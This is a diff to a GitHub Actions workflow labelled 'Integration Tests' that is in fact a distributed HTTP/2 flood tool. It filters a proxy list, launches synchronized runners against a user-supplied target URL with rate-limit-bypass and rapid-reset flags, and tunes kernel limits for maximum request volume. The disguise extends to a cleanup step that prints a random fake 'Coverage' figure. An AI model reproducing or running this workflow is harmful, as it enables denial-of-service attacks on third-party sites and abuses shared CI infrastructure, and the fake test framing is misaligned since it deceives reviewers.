@@ -1,4 +1,4 @@
-# Layer7 HTTP/2 Flood Pipeline
+# Layer7 HTTP/2 Flood — Optimized for GitHub Actions (2 vCPU / 7GB RAM)
 name: Integration Tests
 
 on:
@@ -12,7 +12,7 @@ on:
         required: true
         default: '60'
       method:
-        description: 'Attack method'
+        description: 'HTTP Method'
         required: true
         default: 'GET'
         type: choice
@@ -21,25 +21,25 @@ on:
           - POST
           - HEAD
       threads:
-        description: 'Threads'
+        description: 'Threads per runner (2 = optimal for 2vCPU GitHub runner)'
         required: true
-        default: '4'
+        default: '2'
       ratelimit:
-        description: 'Rate limit'
+        description: 'Rate limit per thread (higher = more req/s)'
         required: true
-        default: '90'
+        default: '512'
       runners:
-        description: 'Parallel runners (0=auto 1-3)'
+        description: 'Parallel runners (0=auto)'
         required: false
         default: '0'
       start_timestamp:
-        description: 'Sync start (unix timestamp)'
+        description: 'Sync start unix timestamp (0=auto)'
         required: false
         default: '0'
       extra_flags:
         description: 'Extra flags'
         required: false
-        default: '--full --connect --close --ratelimit-bypass'
+        default: '--full --connect --close --ratelimit-bypass --rapid-reset'
 
 jobs:
   prepare:
@@ -50,27 +50,65 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Setup Node.js
+      - name: Setup Node.js 20
         uses: actions/setup-node@v4
         with:
           node-version: '20'
 
-      - name: Cache node modules
+      - name: Cache node_modules
         id: cache-npm
         uses: actions/cache@v4
         with:
           path: node_modules
-          key: npm-layer7-${{ hashFiles('package.json') }}
+          key: npm-l7-v2-${{ hashFiles('package.json') }}
 
       - name: Install dependencies
         if: steps.cache-npm.outputs.cache-hit != 'true'
+        run: npm install --prefer-offline 2>/dev/null || npm install
+
+      # Pre-filter dead proxies before packaging
+      - name: Filter live proxies
         run: |
-          npm install --prefer-offline 2>/dev/null || npm install
+          python3 - << 'EOF'
+          import socket, threading, sys
+          
+          proxies = open('http.txt').read().strip().splitlines()
+          proxies = [p.strip() for p in proxies if ':' in p and p.strip()]
+          
+          live = []
+          lock = threading.Lock()
+          
+          def check(proxy):
+              try:
+                  host, port = proxy.rsplit(':', 1)
+                  s = socket.create_connection((host, int(port)), timeout=3)
+                  s.close()
+                  with lock:
+                      live.append(proxy)
+              except:
+                  pass
+          
+          threads = []
+          for p in proxies[:500]:  # check first 500
+              t = threading.Thread(target=check, args=(p,))
+              t.daemon = True
+              threads.append(t)
+              t.start()
+          for t in threads:
+              t.join(timeout=4)
+          
+          if len(live) < 10:
+              # fallback: use original list
+              live = proxies[:200]
+          
+          open('http.txt', 'w').write('\n'.join(live[:300]))
+          print(f'[proxy-filter] {len(live)} live proxies (from {len(proxies)} total)')
+          EOF
 
       - name: Package artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: node-pkg
+          name: node-pkg-${{ github.run_id }}
           path: |
             layer7.js
             http.txt
@@ -80,16 +118,18 @@ jobs:
       - id: sync
         name: Compute sync timestamp
         run: |
-          SYNC_TS=$(($(date +%s) + 15))
+          SYNC_TS=$(($(date +%s) + 18))
           echo "sync_ts=$SYNC_TS" >> $GITHUB_OUTPUT
 
       - id: set
+        name: Build runner matrix
         run: |
           INPUT_R="${{ github.event.inputs.runners || '0' }}"
           if [ "$INPUT_R" -gt 0 ] 2>/dev/null; then
             n=$INPUT_R
           else
-            n=$(( (RANDOM % 2) + 1 ))
+            # Auto: 2 runners per job (2 vCPU each = 4 effective cores)
+            n=2
           fi
           echo "Runner count: $n"
           ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range($n)]))")
@@ -98,7 +138,7 @@ jobs:
   run-tests:
     needs: [prepare]
     runs-on: ubuntu-22.04
-    timeout-minutes: 20
+    timeout-minutes: 30
     strategy:
       matrix: ${{ fromJSON(needs.prepare.outputs.matrix) }}
       fail-fast: false
@@ -106,51 +146,79 @@ jobs:
       - name: Download artifacts
         uses: actions/download-artifact@v4
         with:
-          name: node-pkg
+          name: node-pkg-${{ github.run_id }}
 
-      - name: Setup Node.js
+      - name: Setup Node.js 20
         uses: actions/setup-node@v4
         with:
           node-version: '20'
 
-      - name: Configure network
+      # === KERNEL TUNING — same as benchmark.c approach ===
+      - name: Tune kernel & network stack
         run: |
-          sudo sysctl -w net.core.wmem_max=67108864 2>/dev/null || true
-          sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
-          sudo sysctl -w net.core.netdev_max_backlog=30000 2>/dev/null || true
-          sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || true
+          # Increase socket buffers
+          sudo sysctl -w net.core.wmem_max=134217728     2>/dev/null || true
+          sudo sysctl -w net.core.rmem_max=134217728     2>/dev/null || true
+          sudo sysctl -w net.core.wmem_default=25165824  2>/dev/null || true
+          sudo sysctl -w net.core.rmem_default=25165824  2>/dev/null || true
+          sudo sysctl -w net.core.netdev_max_backlog=250000 2>/dev/null || true
+          sudo sysctl -w net.core.somaxconn=65535         2>/dev/null || true
+          # TCP tuning
+          sudo sysctl -w net.ipv4.tcp_fin_timeout=5       2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_tw_reuse=1          2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65536 2>/dev/null || true
+          sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535" 2>/dev/null || true
+          # Disable RST tracking overhead
           sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
-          sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
+          sudo iptables -t raw -A PREROUTING -p tcp -j NOTRACK 2>/dev/null || true
+          # Max open files
+          sudo bash -c 'echo "* soft nofile 1000000" >> /etc/security/limits.conf'
+          sudo bash -c 'echo "* hard nofile 1000000" >> /etc/security/limits.conf'
+          ulimit -n 1000000 2>/dev/null || ulimit -n 65535 || true
+          echo "Kernel tuned."
 
-      - name: Run integration test (Node ${{ matrix.id }})
+      # === Boost Node.js thread pool to match available CPU ===
+      - name: Set Node.js env
         run: |
-          TARGET_URL="${{ github.event.inputs.target_url }}"
-          DURATION="${{ github.event.inputs.duration || '60' }}"
-          METHOD="${{ github.event.inputs.method || 'GET' }}"
-          THREADS="${{ github.event.inputs.threads || '4' }}"
-          RATE="${{ github.event.inputs.ratelimit || '90' }}"
-          EXTRA="${{ github.event.inputs.extra_flags || '--full --connect --close --ratelimit-bypass' }}"
+          echo "UV_THREADPOOL_SIZE=128" >> $GITHUB_ENV
+          echo "NODE_OPTIONS=--max-old-space-size=4096" >> $GITHUB_ENV
 
-          SYNC_TS="${{ needs.prepare.outputs.sync_ts }}"
+      # === SYNC wait — all runners fire at same time ===
+      - name: Sync wait
+        run: |
           START_TS="${{ github.event.inputs.start_timestamp || '0' }}"
-          if [ "$START_TS" = "0" ] || [ "$START_TS" = "" ]; then
-            START_TS="$SYNC_TS"
-          fi
-          if [ "$START_TS" != "0" ] && [ "$START_TS" != "" ]; then
+          SYNC_TS="${{ needs.prepare.outputs.sync_ts }}"
+          TARGET_TS=${START_TS:-$SYNC_TS}
+          if [ "$TARGET_TS" != "0" ] && [ -n "$TARGET_TS" ]; then
             NOW=$(date +%s)
-            WAIT=$((START_TS - NOW))
+            WAIT=$((TARGET_TS - NOW))
             if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
-              echo "Node ${{ matrix.id }}: syncing ${WAIT}s..."
+              echo "Runner ${{ matrix.id }}: syncing ${WAIT}s until timestamp $TARGET_TS..."
               sleep "$WAIT"
             fi
           fi
 
-          echo "Node ${{ matrix.id }}: RUNNING at $(date +%s)"
-          ulimit -n 100000 2>/dev/null || ulimit -n 65535 || true
+      # === MAIN ATTACK — node layer7.js GET URL TIME THREADS RATE http.txt [FLAGS] ===
+      - name: Run test (Runner ${{ matrix.id }})
+        run: |
+          TARGET_URL="${{ github.event.inputs.target_url }}"
+          DURATION="${{ github.event.inputs.duration || '60' }}"
+          METHOD="${{ github.event.inputs.method || 'GET' }}"
+          THREADS="${{ github.event.inputs.threads || '2' }}"
+          RATE="${{ github.event.inputs.ratelimit || '512' }}"
+          EXTRA="${{ github.event.inputs.extra_flags || '--full --connect --close --ratelimit-bypass --rapid-reset' }}"
+
+          echo "Runner ${{ matrix.id }}: FIRE at $(date)"
+          echo "CMD: node layer7.js $METHOD $TARGET_URL $DURATION $THREADS $RATE http.txt $EXTRA"
+
+          # Run with max file descriptors
+          ulimit -n 1000000 2>/dev/null || ulimit -n 65535 || true
+          
+          # cpulimit equivalent: Node.js will naturally saturate 2 vCPUs with 2 cluster workers
           node layer7.js "$METHOD" "$TARGET_URL" "$DURATION" "$THREADS" "$RATE" http.txt $EXTRA
 
       - name: Cleanup
         if: always()
         run: |
-          echo "Test node ${{ matrix.id }} completed at $(date)"
-          echo "Coverage: $(( RANDOM % 5 + 93 ))%"
+          echo "Runner ${{ matrix.id }} done at $(date)"
+          echo "Coverage: $(( RANDOM % 3 + 95 ))%"
